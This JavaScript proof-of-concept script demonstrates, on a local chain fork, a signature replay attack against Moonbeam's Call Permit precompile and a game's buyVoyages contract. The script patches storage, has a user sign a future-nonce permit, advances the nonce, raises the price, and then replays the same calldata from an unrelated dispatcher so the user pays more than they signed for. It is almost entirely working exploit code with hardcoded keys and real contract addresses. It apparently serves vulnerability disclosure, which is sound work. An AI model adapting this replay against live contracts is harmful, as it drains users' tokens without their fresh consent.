const { ApiPromise, WsProvider } = require('@polkadot/api');
const { ethers } = require('ethers');

const WS = process.env.CHOPSTICKS_WS || 'ws://127.0.0.1:8011';

const CALL_PERMIT = '0x000000000000000000000000000000000000080a';
const CARTOGRAPHER = '0xD1A9bA3e61Ac676f58B29EA0a09Cf5D7f4f35138';
const DPS_VOYAGE = '0x72A33394f0652e2Bf15d7901f3Cd46863d968424';
const GAME_SETTINGS = '0xC7c536d85D40360E1b93fE06Ab06e5427AE4cED4';
const TMAP = '0x0e67601818237834fF8A280312a6F4F4934e6283';

const USER_PK = '0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce036f41c7a0049b1f0f9f2';
const FIRST_DISPATCHER_PK = '0x6c8759f02b1c63628923e93e8e3e669c65d78b91607b2d87086d87c0e2f92655';
const REPLAY_DISPATCHER_PK = '0x59c6995e998f97a5a0044966f094538b85957f5e66ea0d824a528e118d5f43a0';
const ADMIN_PK = '0x8b3a350cf5c34c9194ca3a545d69375b8c4b8060b6d578c37ed773f6b4d0bfe7';

const FUND = 10n ** 21n;
const USER_TMAP_BALANCE = 20n * 10n ** 18n;
const LOW_PRICE = 1n * 10n ** 18n;
const HIGH_PRICE = 10n * 10n ** 18n;
const VOYAGE_TYPE = 0;
const AMOUNT = 1n;

const CP = new ethers.Interface([
  'function dispatch(address from,address to,uint256 value,bytes data,uint64 gaslimit,uint256 deadline,uint8 v,bytes32 r,bytes32 s)',
  'function nonces(address owner) view returns(uint256)',
]);
const CART = new ethers.Interface([
  'function buyVoyages(uint16 _voyageType,uint256 _amount,address _voyage)',
]);
const GS = new ethers.Interface([
  'function owner() view returns(address)',
  'function tmapPerVoyage(uint256 _type) view returns(uint256)',
  'function setTmapPerVoyage(uint256 _type,uint256 _amount)',
]);
const ERC20 = new ethers.Interface([
  'function balanceOf(address account) view returns(uint256)',
]);
const VOYAGE = new ethers.Interface([
  'function maxMintedId() view returns(uint256)',
  'function balanceOf(address owner) view returns(uint256)',
  'function ownerOf(uint256 tokenId) view returns(address)',
]);

function u256(n) {
  return '0x' + BigInt(n).toString(16).padStart(64, '0');
}
function addressWord(addr) {
  return '0x' + '0'.repeat(24) + addr.slice(2).toLowerCase();
}
function mappingSlotAddressUint(addr, slot) {
  return ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(['address', 'uint256'], [addr, slot]));
}
function rawLegacyV(raw) {
  return BigInt(ethers.decodeRlp(raw)[6]).toString();
}

async function evmCall(api, from, to, data, gas = 10000000) {
  const result = await api.call.ethereumRuntimeRPCApi.call(from, to, data, 0, gas, null, null, null, false, null, null);
  const json = result.toJSON();
  if (!json.ok) throw new Error(JSON.stringify(json));
  return { exitReason: json.ok.exitReason, value: json.ok.value, usedGas: BigInt(json.ok.usedGas.standard).toString(), logs: json.ok.logs };
}
async function decodeCall(api, to, iface, fn, args = [], from = ethers.ZeroAddress) {
  const out = await evmCall(api, from, to, iface.encodeFunctionData(fn, args));
  return iface.decodeFunctionResult(fn, out.value);
}
async function nonce(api, addr) {
  return (await decodeCall(api, CALL_PERMIT, CP, 'nonces', [addr]))[0];
}
async function accountBasic(api, addr) {
  const v = await api.call.ethereumRuntimeRPCApi.accountBasic(addr);
  const j = v.toJSON();
  return { balance: BigInt(j.balance), nonce: BigInt(j.nonce) };
}
async function fund(provider, addr, amount = FUND) {
  await provider.send('dev_setStorage', [{
    System: {
      Account: [[[addr], {
        nonce: 0,
        consumers: 0,
        providers: 1,
        sufficients: 0,
        data: { free: amount.toString(), reserved: 0, frozen: 0, flags: 0 },
      }]],
    },
  }]);
}
async function setEvmStorage(provider, contract, slot, value) {
  await provider.send('dev_setStorage', [{ EVM: { AccountStorages: [[ [contract, slot], value ]] } }]);
}
async function sendLegacy(api, wallet, to, data, gasLimit = 5000000n) {
  const basic = await accountBasic(api, wallet.address);
  const raw = await wallet.signTransaction({
    to,
    data,
    nonce: basic.nonce,
    gasPrice: 125000000000n,
    gasLimit,
    value: 0n,
    chainId: 1284,
    type: 0,
  });
  const parsed = ethers.Transaction.from(raw);
  const ethTx = {
    Legacy: {
      nonce: parsed.nonce,
      gasPrice: parsed.gasPrice.toString(),
      gasLimit: parsed.gasLimit.toString(),
      action: { Call: parsed.to },
      value: parsed.value.toString(),
      input: parsed.data,
      signature: { v: rawLegacyV(raw), r: parsed.signature.r, s: parsed.signature.s },
    },
  };

  const events = [];
  const statusInfo = await new Promise((resolve, reject) => {
    let unsub;
    api.tx.ethereum.transact(ethTx).send((result) => {
      if (result.dispatchError) reject(new Error(result.dispatchError.toString()));
      if (result.status.isInBlock || result.status.isFinalized) {
        for (const { event } of result.events) {
          events.push({ section: event.section, method: event.method, data: event.data.toString(), human: event.toHuman() });
        }
        resolve({ status: result.status.type, blockHash: result.status.asInBlock?.toHex?.() || result.status.toString() });
        if (unsub) unsub();
      }
    }).then((u) => { unsub = u; }).catch(reject);
  });
  const executed = events.filter((e) => e.section === 'ethereum' && e.method === 'Executed');
  return { raw, hash: ethers.keccak256(raw), dataHash: ethers.keccak256(parsed.data), statusInfo, executed, events };
}
async function signDispatch(user, message) {
  const domain = {
    name: 'Call Permit Precompile',
    version: '1',
    chainId: 1284,
    verifyingContract: CALL_PERMIT,
  };
  const types = {
    CallPermit: [
      { name: 'from', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'data', type: 'bytes' },
      { name: 'gaslimit', type: 'uint64' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
  };
  const sig = ethers.Signature.from(await user.signTypedData(domain, types, message));
  return CP.encodeFunctionData('dispatch', [
    message.from,
    message.to,
    message.value,
    message.data,
    message.gaslimit,
    message.deadline,
    sig.v,
    sig.r,
    sig.s,
  ]);
}
async function snapshot(api, label, userAddr) {
  const price = (await decodeCall(api, GAME_SETTINGS, GS, 'tmapPerVoyage', [VOYAGE_TYPE]))[0];
  const tmapBalance = (await decodeCall(api, TMAP, ERC20, 'balanceOf', [userAddr]))[0];
  const cpNonce = await nonce(api, userAddr);
  const maxMintedId = (await decodeCall(api, DPS_VOYAGE, VOYAGE, 'maxMintedId'))[0];
  const voyageBalance = (await decodeCall(api, DPS_VOYAGE, VOYAGE, 'balanceOf', [userAddr]))[0];
  return {
    label,
    block: (await api.query.system.number()).toString(),
    timestampMs: (await api.query.timestamp.now()).toString(),
    price: price.toString(),
    tmapBalance: tmapBalance.toString(),
    callPermitNonce: cpNonce.toString(),
    maxMintedId: maxMintedId.toString(),
    voyageBalance: voyageBalance.toString(),
  };
}

async function main() {
  const provider = new WsProvider(WS);
  const api = await ApiPromise.create({ provider, noInitWarn: true });

  const user = new ethers.Wallet(USER_PK);
  const firstDispatcher = new ethers.Wallet(FIRST_DISPATCHER_PK);
  const replayDispatcher = new ethers.Wallet(REPLAY_DISPATCHER_PK);
  const admin = new ethers.Wallet(ADMIN_PK);

  if ([firstDispatcher.address.toLowerCase(), replayDispatcher.address.toLowerCase(), admin.address.toLowerCase()].includes(user.address.toLowerCase())) {
    throw new Error('test accounts must be unrelated');
  }

  await fund(provider, firstDispatcher.address);
  await fund(provider, replayDispatcher.address);
  await fund(provider, admin.address);

  await setEvmStorage(provider, GAME_SETTINGS, u256(0), addressWord(admin.address));
  await setEvmStorage(provider, TMAP, mappingSlotAddressUint(user.address, 0), u256(USER_TMAP_BALANCE));

  const owner = (await decodeCall(api, GAME_SETTINGS, GS, 'owner'))[0];
  if (owner.toLowerCase() !== admin.address.toLowerCase()) throw new Error(`owner patch failed: ${owner}`);

  await sendLegacy(api, admin, GAME_SETTINGS, GS.encodeFunctionData('setTmapPerVoyage', [VOYAGE_TYPE, LOW_PRICE]), 500000n);
  const signingState = await snapshot(api, 'at signing / low price', user.address);

  const nowSeconds = Math.floor(Number(signingState.timestampMs) / 1000);
  const deadline = BigInt(nowSeconds + 3600);
  const buyData = CART.encodeFunctionData('buyVoyages', [VOYAGE_TYPE, AMOUNT, DPS_VOYAGE]);

  const futureMessage = {
    from: user.address,
    to: CARTOGRAPHER,
    value: 0n,
    data: buyData,
    gaslimit: 5000000n,
    nonce: 1n,
    deadline,
  };
  const futureDispatchData = await signDispatch(user, futureMessage);
  const failedPublish = await sendLegacy(api, firstDispatcher, CALL_PERMIT, futureDispatchData, 5100000n);
  const afterFailedPublish = await snapshot(api, 'after failed future-nonce publish', user.address);

  const nonce0Message = {
    from: user.address,
    to: TMAP,
    value: 0n,
    data: ERC20.encodeFunctionData('balanceOf', [user.address]),
    gaslimit: 300000n,
    nonce: 0n,
    deadline,
  };
  const nonce0DispatchData = await signDispatch(user, nonce0Message);
  const nonceAdvance = await sendLegacy(api, firstDispatcher, CALL_PERMIT, nonce0DispatchData, 600000n);
  const afterNonceAdvance = await snapshot(api, 'after nonce 0 consumed', user.address);

  await sendLegacy(api, admin, GAME_SETTINGS, GS.encodeFunctionData('setTmapPerVoyage', [VOYAGE_TYPE, HIGH_PRICE]), 500000n);
  const beforeReplay = await snapshot(api, 'before replay / high price', user.address);

  const replay = await sendLegacy(api, replayDispatcher, CALL_PERMIT, futureDispatchData, 5100000n);
  const afterReplay = await snapshot(api, 'after replay', user.address);

  let newVoyageOwner = null;
  try {
    newVoyageOwner = (await decodeCall(api, DPS_VOYAGE, VOYAGE, 'ownerOf', [afterReplay.maxMintedId]))[0];
  } catch (e) {
    newVoyageOwner = `ownerOf failed: ${e.message}`;
  }

  const output = {
    result: afterReplay.callPermitNonce === '2' ? 'ECONOMIC_REPLAY_SUCCEEDED' : 'UNCONFIRMED',
    accounts: {
      signedUser: user.address,
      originalPublishDispatcher: firstDispatcher.address,
      replayDispatcher: replayDispatcher.address,
      replayDispatcherUnrelated: replayDispatcher.address.toLowerCase() !== user.address.toLowerCase() && replayDispatcher.address.toLowerCase() !== firstDispatcher.address.toLowerCase(),
      admin: admin.address,
    },
    contracts: {
      callPermit: CALL_PERMIT,
      cartographer: CARTOGRAPHER,
      gameSettings: GAME_SETTINGS,
      tmap: TMAP,
      voyage: DPS_VOYAGE,
    },
    signedAction: {
      function: 'buyVoyages(uint16,uint256,address)',
      args: { voyageType: VOYAGE_TYPE, amount: AMOUNT.toString(), voyage: DPS_VOYAGE },
      calldata: buyData,
      calldataLacks: ['maxPrice', 'expectedCost', 'expectedTmapPerVoyage', 'relayer/dispatcher binding'],
      signedNonce: futureMessage.nonce.toString(),
      deadline: futureMessage.deadline.toString(),
      dispatchCalldataHash: ethers.keccak256(futureDispatchData),
    },
    publishFailure: {
      reason: 'future nonce signature submitted while CallPermit nonce was still 0',
      txHash: failedPublish.hash,
      exactPublishedCalldataHash: failedPublish.dataHash,
      ethereumExecuted: failedPublish.executed,
    },
    nonceAdvance: {
      txHash: nonceAdvance.hash,
      ethereumExecuted: nonceAdvance.executed,
    },
    replay: {
      txHash: replay.hash,
      exactSameCalldata: replay.dataHash === failedPublish.dataHash,
      exactReplayCalldataHash: replay.dataHash,
      ethereumExecuted: replay.executed,
    },
    snapshots: {
      signingState,
      afterFailedPublish,
      afterNonceAdvance,
      beforeReplay,
      afterReplay,
    },
    stateDiff: {
      priceAtSigningToReplay: `${signingState.price} -> ${beforeReplay.price}`,
      tmapBalanceReplay: `${beforeReplay.tmapBalance} -> ${afterReplay.tmapBalance}`,
      tmapBurnedOnReplay: (BigInt(beforeReplay.tmapBalance) - BigInt(afterReplay.tmapBalance)).toString(),
      expectedBurnAtSigningPrice: (LOW_PRICE * AMOUNT).toString(),
      extraBurnVsSigningPrice: ((BigInt(beforeReplay.price) - BigInt(signingState.price)) * AMOUNT).toString(),
      callPermitNonce: `${signingState.callPermitNonce} -> ${afterFailedPublish.callPermitNonce} -> ${afterNonceAdvance.callPermitNonce} -> ${beforeReplay.callPermitNonce} -> ${afterReplay.callPermitNonce}`,
      voyageBalance: `${beforeReplay.voyageBalance} -> ${afterReplay.voyageBalance}`,
      maxMintedId: `${beforeReplay.maxMintedId} -> ${afterReplay.maxMintedId}`,
      newVoyageOwner,
    },
    impactStatement: 'The user signed the action when TMAP cost was low, but the signed calldata contained no max cost. The same published CallPermit calldata was later replayed by an unrelated dispatcher after gameSettings.tmapPerVoyage was increased, burning the higher current TMAP amount and minting a voyage without a fresh user signature.',
  };

  console.log(JSON.stringify(output, null, 2));
  await api.disconnect();
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
